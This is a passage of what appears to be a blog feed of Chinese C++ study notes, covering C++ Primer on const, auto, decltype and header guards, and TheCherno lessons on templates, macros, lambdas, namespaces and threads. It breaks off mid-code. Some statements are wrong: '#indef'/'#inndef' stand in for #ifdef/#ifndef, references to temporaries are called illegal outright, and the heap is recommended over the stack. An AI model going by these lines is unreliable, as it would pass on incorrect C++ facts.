p2;//*是对p1的修饰，所以p2还是int型</code></p></li></ul><h2 id="const限定符">const限定符</h2><ul><li>动机：希望定义一些不能被改变值的变量。</li></ul><h3 id="初始化和const">初始化和const</h3><ul><li>const对象<strong>必须初始化</strong>，且<strong>不能被改变</strong>。</li><li>const变量默认不能被其他文件访问，非要访问，必须在指定const定义之前加extern。要想在多个文件中使用const变量共享，定义和声明都加const关键字即可。</li></ul><h3 id="const的引用">const的引用</h3><ul><li><strong>reference to const</strong>（对常量的引用）：指向const对象的引用，如 <code>const int ival=1; const int &amp;refVal = ival;</code>，可以读取但不能修改<code>refVal</code>。</li><li><strong>临时量</strong>（temporary）对象：当编译器需要一个空间来暂存表达式的求值结果时，临时创建的一个未命名的对象。</li><li>对临时量的引用是非法行为。</li></ul><h3 id="指针和const">指针和const</h3><ul><li><strong>pointer to const</strong>（指向常量的指针）：不能用于改变其所指对象的值, 如 <code>const double pi = 3.14; const double *cptr = &amp;pi;</code>。</li><li><strong>const pointer</strong>：指针本身是常量，也就是说指针固定指向该对象，（存放在指针中的地址不变，地址所对应的那个对象值可以修改）如 <code>int i = 0; int *const ptr = &amp;i;</code></li></ul><h3 id="顶层const">顶层const</h3><ul><li><code>顶层const</code>：指针本身是个常量。</li><li><code>底层const</code>：指针指向的对象是个常量。拷贝时严格要求相同的底层const资格。</li></ul><h3 id="constexpr和常量表达式（▲可选）"><code>constexpr</code>和常量表达式（▲可选）</h3><ul><li>常量表达式：指值不会改变，且在编译过程中就能得到计算结果的表达式。</li><li><code>C++11</code>新标准规定，允许将变量声明为<code>constexpr</code>类型以便由编译器来验证变量的值是否是一个常量的表达式。</li></ul><h2 id="处理类型">处理类型</h2><h3 id="类型别名">类型别名</h3><ul><li>传统别名：使用<strong>typedef</strong>来定义类型的同义词。 <code>typedef double wages;</code></li><li>新标准别名：别名声明（alias declaration）： <code>using SI = Sales_item;</code>（C++11）</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于复合类型（指针等）不能代回原式来进行理解</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> *pstring;  <span class="comment">// pstring是char*的别名</span></span><br><span class="line"><span class="type">const</span> pstring cstr = <span class="number">0</span>; <span class="comment">// 指向char的常量指针</span></span><br><span class="line"><span class="comment">// 如改写为const char *cstr = 0;不正确，为指向const char的指针</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 辅助理解（可代回后加括号）</span></span><br><span class="line"><span class="comment">// const pstring cstr = 0;代回后const (char *) cstr = 0;</span></span><br><span class="line"><span class="comment">// const char *cstr = 0;即为(const char *) cstr = 0;</span></span><br></pre></td></tr></table></figure><h3 id="auto类型说明符-c-11">auto类型说明符 c++11</h3><ul><li><strong>auto</strong>类型说明符：让编译器<strong>自动推断类型</strong>。</li><li>一条声明语句只能有一个数据类型，所以一个auto声明多个变量时只能相同的变量类型(包括复杂类型&amp;和*)。<code>auto sz = 0, pi =3.14//错误</code></li><li><code>int i = 0, &amp;r = i; auto a = r;</code> 推断<code>a</code>的类型是<code>int</code>。</li><li>会忽略<code>顶层const</code>。</li><li><code>const int ci = 1; const auto f = ci;</code>推断类型是<code>int</code>，如果希望是顶层const需要自己加<code>const</code></li></ul><h3 id="decltype类型指示符">decltype类型指示符</h3><ul><li>从表达式的类型推断出要定义的变量的类型。</li><li><strong>decltype</strong>：选择并返回操作数的<strong>数据类型</strong>。</li><li><code>decltype(f()) sum = x;</code> 推断<code>sum</code>的类型是函数<code>f</code>的返回类型。</li><li>不会忽略<code>顶层const</code>。</li><li>如果对变量加括号，编译器会将其认为是一个表达式，如int i–&gt;(i),则decltype((i))得到结果为int&amp;引用。</li><li>赋值是会产生引用的一类典型表达式，引用的类型就是左值的类型。也就是说，如果 i 是 int，则表达式 i=x 的类型是 int&amp;。</li><li><code>C++11</code></li></ul><h2 id="自定义数据结构">自定义数据结构</h2><h3 id="struct">struct</h3><blockquote><p>尽量不要吧类定义和对象定义放在一起。如<code>struct Student&#123;&#125; xiaoming,xiaofang;</code></p></blockquote><ul><li>类可以以关键字<code>struct</code>开始，紧跟类名和类体。</li><li>类数据成员：类体定义类的成员。</li><li><code>C++11</code>：可以为类数据成员提供一个<strong>类内初始值</strong>（in-class initializer）。</li></ul><h3 id="编写自己的头文件">编写自己的头文件</h3><ul><li>头文件通常包含哪些只能被定义一次的实体：类、<code>const</code>和<code>constexpr</code>变量。</li></ul><p>预处理器概述：</p><ul><li><strong>预处理器</strong>（preprocessor）：确保头文件多次包含仍能安全工作。</li><li>当预处理器看到<code>#include</code>标记时，会用指定的头文件内容代替<code>#include</code></li><li><strong>头文件保护符</strong>（header guard）：头文件保护符依赖于预处理变量的状态：已定义和未定义。<ul><li><code>#indef</code>已定义时为真</li><li><code>#inndef</code>未定义时为真</li><li>头文件保护符的名称需要唯一，且保持全部大写。养成良好习惯，不论是否该头文件被包含，要加保护符。</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SALES_DATA_H  <span class="comment">//SALES_DATA_H未定义时为真</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SALES_DATA_H</span></span><br><span class="line">strct Sale_data&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第1章 开始</title>
      <link href="/2023/05/01/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch01/"/>
      <url>/2023/05/01/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch01/</url>
      
        <content type="html"><![CDATA[<h2 id="熟悉编译器">熟悉编译器</h2><p><strong>g++</strong>：</p><ul><li>编译：<code>g++ --std=c++11 ch01.cpp -o main</code></li><li>运行：<code>./prog1</code></li><li>查看运行状态：<code>echo $?</code></li><li><strong>编译多个文件</strong>:<code>g++ ch2.cpp Sales_item.cc -o main</code></li></ul><p>输入 <code>g++ --help</code>，查看编译器选项，部分常见选项如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-E                       Preprocess only; do not compile, assemble or link</span><br><span class="line">-S                       Compile only; do not assemble or link</span><br><span class="line">-c                       Compile and assemble, but do not link</span><br><span class="line">-o &lt;file&gt;                Place the output into &lt;file&gt;</span><br><span class="line">-pie                     Create a position independent executable</span><br><span class="line">-shared                  Create a shared library</span><br></pre></td></tr></table></figure><p><strong>获得程序状态</strong>:</p><ul><li>windows: <code>echo %ERRORLEVEL%</code></li><li>UNIX: <code>echo $?</code></li></ul><h2 id="IO">IO</h2><ul><li><code>#include &lt;iostream&gt;</code></li><li><code>std::cout &lt;&lt; &quot;hello&quot;</code></li><li><code>std::cin &gt;&gt; v1</code></li></ul><p>记住<code>&gt;&gt;</code>和<code>&lt;&lt;</code>返回的结果都是左操作数，也就是输入流和输出流本身。</p><p><strong>endl</strong>：这是一个被称为<strong>操纵符</strong>（manipulator）的特殊值，效果是<strong>结束当前行，并将设备关联的缓冲区（buffer）中的内容刷到设备中</strong>。</p><p>UNIX和Mac下键盘输入文件结束符：<code>ctrl+d</code>，Windows下：<code>ctrl+z</code></p><p><strong>头文件</strong>：类的类型一般存储在头文件中，标准库的头文件使用<code>&lt;&gt;</code>，非标准库的头文件使用<code>&quot;&quot;</code>。申明写在<code>.h</code>文件，定义实现<strong>写</strong>在<code>.cpp</code>文件。</p><p><strong>避免多次包含同一头文件</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SALESITEM_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SALESITEM_H</span></span><br><span class="line"><span class="comment">// Definition of Sales_itemclass and related functions goes here</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><strong>成员函数（类方法）</strong>：使用<code>.</code>调用。</p><p><strong>命名空间（namespace）</strong>：使用作用域运算符<code>::</code>调用。</p><h2 id="注释">注释</h2><ul><li>单行注释： <code>//</code></li><li>多行注释： <code>/**/</code>。编译器将<code>/*</code>和<code>*/</code>之间的内容都作为注释内容忽略。<strong>注意不能嵌套</strong>。</li></ul><h2 id="使用文件重定向">使用文件重定向</h2><p><code>./main &lt;infile &gt;outfile</code></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cherno笔记(51-70)</title>
      <link href="/2023/04/15/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-51-70/"/>
      <url>/2023/04/15/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-51-70/</url>
      
        <content type="html"><![CDATA[<p>课程地址：<a href="https://www.youtube.com/watch?v=18c3MTX0PK0&amp;list=PLlrATfBNZ98dudnM48yfGUldqGD0S4FFb&amp;index=1">Youtube上TheCherno上传的视频</a><br>翻译：<a href="https://www.bilibili.com/video/BV1uy4y167h2/?spm_id_from=333.788&amp;vd_source=0d3fa48307c38b76dfdfa60ed4b44b42">神经元猫的高质量翻译</a></p><h1 id="51-Making-and-Working-with-Libraries-in-C-Multiple-Projects-in-Visual-Studio">51 Making and Working with Libraries in C++ (Multiple Projects in Visual Studio)</h1><p>讲如何在vs中建立多个项目，以及如何创建一个库让所有项目都能用。</p><ol><li>确保目标project的配置类型为静态类.(lib)。</li><li>设置“附件包含目录”以便能在include时能正确寻找到目标文件。</li><li>添加引用，这会帮我们自动设置连接器输入，并且改名时不受影响，还会自动创建完整的依赖关系图，先编译依赖后编译此文件。</li></ol><p>由于是静态链接，移动后仍然可用，若为动态链接则必须和dll文件在同一目录下。</p><h1 id="52-How-to-Deal-with-Multiple-Return-Values-in-C">52 How to Deal with Multiple Return Values in C++</h1><h2 id="法1-返回struct">法1 返回struct</h2><h2 id="法2-传入存结果的指针，没有动态分配">法2 传入存结果的指针，没有动态分配</h2><p>从技术上来说可能是最理想的方法，因为没有复制。</p><h2 id="法3-返回数组——只有类型相同时才适用">法3 返回数组——只有类型相同时才适用</h2><p>声明：<code>static std::string* ParseShader(const std::string&amp; filepath);</code> 或 <code>static std::array&lt;std::string, 2&gt; ParseShader(const std::string&amp; filepath);</code> 改用vector也行</p><p>返回：<code>return new std::string[]&#123;vs, fs&#125;;</code>或<code>return std::array&lt;std::string, 2&gt;(vs, fs);</code> new会导致堆分配的发生，同时只适合返回单一类型。</p><p>array会在栈上创建，而vector底层存储是在堆上。</p><h2 id="法4-返回tuple或pair，容易搞混">法4 返回tuple或pair，容易搞混</h2><p>#include <tuple><br>#include <utility> (make_tuple)<br>static std::tuple或者pair&lt;返回类型1，返回类型2&gt; func( , )<br>return make_pair(返回值1，返回值2)</utility></tuple></p><p>从tuple 中获得值<br>source=返回的元组(tuple or like pair)<br>std::get&lt;0/1/2/3&gt;(tuple名source);<br>pair 的类型，可以用 source.first</p><h1 id="53-Templates-in-C">53 Templates in C++</h1><p>template与“泛型”不同，也不能说完全不同，比泛型牛逼的多（泛型非常受限于类型系统）。template有点像宏。</p><p>template允许定义一个可根据用途进行编译的模板（让编译器基于一套规则，为你写代码）。</p><p><strong>模板不是实际存在的函数</strong>（MSVC中有错误可能也能过编译，vs2022不能过），只有当调用时才会被实际创建。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;  <span class="comment">// 用class或typename均可，这里class和类类型不是一个</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">(T value)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; value &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Print</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">Print</span>&lt;<span class="type">int</span>&gt;(<span class="number">6</span>);</span><br><span class="line">  <span class="built_in">Print</span>(<span class="number">5.5f</span>);</span><br><span class="line">  <span class="built_in">Print</span>(<span class="string">&quot;JKA&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模板绝不仅限于类型或则任何东西，也不限于函数，可创建一整个类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T, <span class="type">int</span> N&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Array</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  T m_Array[N];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">GetSize</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> N;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Array&lt;std::string, <span class="number">5</span>&gt; array;</span><br><span class="line">  std::cout &lt;&lt; array.<span class="built_in">GetSize</span>() &lt;&lt; std::endl;</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="54-Stack-vs-Heap-Memory-in-C">54 Stack vs Heap Memory in C++</h1><p>堆内存和栈内存的 <strong>内存分配</strong> 方式不同。<br>栈分配非常快，所做的就是移动栈指针，就像一条CPU指令。栈大小比如2M。<br>堆内存分配是一堆事情，程序维护空闲列表，如果需要内存过大还会向OS申请内存，这非常耗费资源。<br>使用上，尽量使用堆，除非<strong>需要变量生存期</strong>大于作用域，或需要<strong>很大的内存</strong>。</p><p>对于 struct Vector3 {float x, y, z;} 堆分配使用<code>Vector3* hvector = new Vector3();</code> 或<code>Vector3* hvector = new Vector3;</code> 都是可以的</p><h1 id="55-Macros-in-C">55 Macros in C++</h1><p>宏是一个很宽泛的概念，这里指C++中使用预处理器来“宏”化某些操作。<br>预处理器处理宏发生在预编译期，所做的就是查找和替换——所以不要加分号</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#defint LOG(x) std::cout &lt;&lt; x &lt;&lt; std::endl</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">LOG</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编程习惯：不要向人炫耀你知道所有的C++特性，尤其是高级特性更应当减少使用（新手常犯的误区）。<br>使用宏会让别人困惑，别人得去找到宏才能看懂。</p><p>适合用宏的场景：在现实开发中在开发阶段需要日志系统，在发布阶段可能需要去掉（减少透露信息，提升性能）。</p><p>在VS项目属性设置中，在**“DEBUG”配置中预处理器-预处理器定义中设置<code>PR_DEBUG=1</code>** （注意不要有空格，不过好像有也没事）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用#if比使用#ifdef要好</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PR_DEBUG == 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(x) std::cout &lt;&lt; x &lt;&lt; std::endl;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOG(x)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">LOG</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>可以使用反斜杠对换行符进行转移</strong>，注意后面不要有空格，否则就是对空格转义而非对换行符转义。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN int main() &#123;\</span></span><br><span class="line"><span class="meta">  std::cin.get();\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="56-The-“auto”-keyword-in-C">56 The “auto” keyword in C++</h1><p>两面性：一方面API改变修改返回值类型后客户端不需要修改，另一方面可能会<strong>破坏依赖于特定类型的代码、还会降低可读性</strong>（别人不能很快明白类型）。</p><p>推荐：如果类型非常长就推荐用，此时当进入非常复杂的代码集，包含了模板等，就不得不用auto，因为不知道类型是什么（不要写这么复杂的代码，这很难向别人解释代码如何工作，很难维护）。</p><p>auto不会加引用，存储返回结果得用 <code>const auto&amp; res =</code></p><h1 id="57-Static-Arrays-in-C-std-array">57 Static Arrays in C++ (std::array)</h1><p>std::array也是放在栈上，和普通数组的工作方式基本一样，不需要手动维护数组大小，还能使用sort等标准函数，还能可选边界检查（Release模式下无，边界检查会影响程序性能）。而std::vector是在堆上。<br>std::array的size直接返回模板参数，不是返回size变量等——<strong>不额外占用空间</strong>。<br><strong>std::array的实现相当高效，应该用其替代C风格的数组。</strong></p><p><strong>头文件如果是一个模板类，头文件就是所需的全部，不需要实现文件。</strong></p><h1 id="58-Function-Pointers-in-C">58 Function Pointers in C++</h1><p>本节课讲原始C风格的函数指针。</p><p>函数指针是将一个函数赋值给一个变量的方法，这与我们之前通过()调用函数的使用方法不同，扩展：还能将函数作为参数传给其他函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">HelloWorld</span><span class="params">(<span class="type">int</span> a)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Hello World! Value: &quot;</span> &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//auto func = HelloWorld;  // 法1，推荐</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// void(*func)(int) = HelloWorld;  // 法2, C风格函数指针真的很奇怪</span></span><br><span class="line">  <span class="comment">// void指返回值类型</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*HelloWorldFunc)</span><span class="params">(<span class="type">int</span>)</span></span>;  <span class="comment">// 法3</span></span><br><span class="line">  HelloWorldFunc func = HelloWorld;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">func</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>lambda本质上就是一个普通函数，只是<strong>它不像普通函数这样声明，它是在我们的代码在过程中生成的，用完即弃的函数。</strong></p><p>[ ] 叫做 捕获方式，即如何传入传出参数。</p><p>注意下面代码中 函数指针 的写法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ForEach</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; values, <span class="type">void</span>(*func)(<span class="type">int</span>))</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> value : values) &#123;</span><br><span class="line">    <span class="built_in">func</span>(value);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::vector&lt;<span class="type">int</span>&gt; values = &#123; <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;  <span class="comment">// 初始化列表</span></span><br><span class="line">  <span class="built_in">ForEach</span>(values, [](<span class="type">int</span> value) &#123;  <span class="comment">// lambda表达式作为参数传递</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Values: &quot;</span> &lt;&lt; value &lt;&lt; std::endl;</span><br><span class="line">    &#125;);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="59-Lambdas-in-C">59 Lambdas in C++</h1><p>lambda本质上是定义一种叫作匿名函数的方式，不需要实际创建一个函数，就像一个快速的一次性函数，展示下需要运行的代码。<strong>它更像一个变量，而非一个正式的函数，在实际编译的代码中作为一个符号存在</strong>。</p><p>工作原理：只要你有一个函数指针，都可以在C++中使用lambda。</p><p>用法：在我们会设置函数指针指向函数的任何地方，都可以将它设置成lambda。我们所做的就是构造一个稍后会调用的函数。</p><p>[ ] 捕获方式：打算如何传递变量。</p><ul><li>[=] 全部按值传递。</li><li>[&amp;] 全部按引用传递。</li><li>[a, &amp;b] a通过值传递，b通过引用传递。</li></ul><p><strong>非捕获lambda可以隐式转换为函数指针，而有捕获lambda不可以。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span>**</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//无法将参数 2 从“main::&lt;lambda_2&gt;”转换为“void(__cdecl*)(int)”</span></span><br><span class="line"><span class="comment">//void ForEach(const std::vector&lt;int&gt;&amp; values, void(*func)(int)) &#123;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ForEach</span><span class="params">(<span class="type">const</span> std::vector&lt;<span class="type">int</span>&gt;&amp; values, <span class="type">const</span> std::function&lt;<span class="type">void</span>(<span class="type">int</span>)&gt;&amp; func)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> value : values)</span><br><span class="line">    <span class="built_in">func</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::vector&lt;<span class="type">int</span>&gt; values = &#123; <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span> &#125;;</span><br><span class="line">  <span class="keyword">auto</span> it = std::<span class="built_in">find_if</span>(values.<span class="built_in">begin</span>(), values.<span class="built_in">end</span>(), [](<span class="type">int</span> value) &#123;<span class="keyword">return</span> value &gt; <span class="number">0</span>; &#125;);</span><br><span class="line">  std::cout &lt;&lt; *it &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> a = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">auto</span> lambda = [=](<span class="type">int</span> value) &#123;std::cout &lt;&lt; <span class="string">&quot;Values: &quot;</span> &lt;&lt; value &lt;&lt; std::endl; &#125;;</span><br><span class="line">  <span class="built_in">ForEach</span>(values, lambda);</span><br><span class="line">  std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="60-Why-I-don’t-“using-namespace-std”">60 Why I don’t “using namespace std”</h1><p>使用using namespace std后就不知道所知用的函数来自哪个namespace。公司可能会有自己的stl版本，比如EASTL，std::vector和eastl::vector好区分，而使用using namespace 语句后就没那么容易区分了。</p><p><strong>绝对不要在头文件中使用using namespace</strong>。<br>cherno也会用using namespace，但只会using自己的库，而不会使用std或者eastl。<br>如果确实要使用using namespace，就<strong>在一个足够小的作用域下使用。</strong></p><h1 id="61-Namespaces-in-C">61 Namespaces in C++</h1><p>C中无命名空间，不能将一个函数命名为Init，得叫glfwInit，glBegin等。</p><p>C++中有命名空间，主要目的是避免命名冲突，希望能够在不同的上下文中调用相同的符号。</p><p><code>::</code> 是命名空间操作符。</p><p>**类本身也是一种命名空间；**枚举不是命名空间，而枚举类是。</p><p>一般在头文件.h中禁止使用using namespace，因为这样会导致别人引用你的头文件时出现冲突。在cpp里你可以用，但为了养成良好习惯一般用什么写什么，比如using std::vector;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">using</span> <span class="title">orange::print</span><span class="params">()</span></span>;  <span class="comment">// 只为print指定命名空间，print_again需再指定</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">apple::<span class="built_in">print_again</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> o = orange;  <span class="comment">// 为namespace起别名</span></span><br><span class="line">o::<span class="built_in">print</span>();</span><br></pre></td></tr></table></figure><p><strong>严肃项目中，所有函数都应放在namespace xxx {} 里面。</strong></p><h1 id="62-Threads-in-C">62 Threads in C++</h1><p>如果不使用线程，无法让程序同时做两件事（比如同时等待用户输入，和向控制台打印消息）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 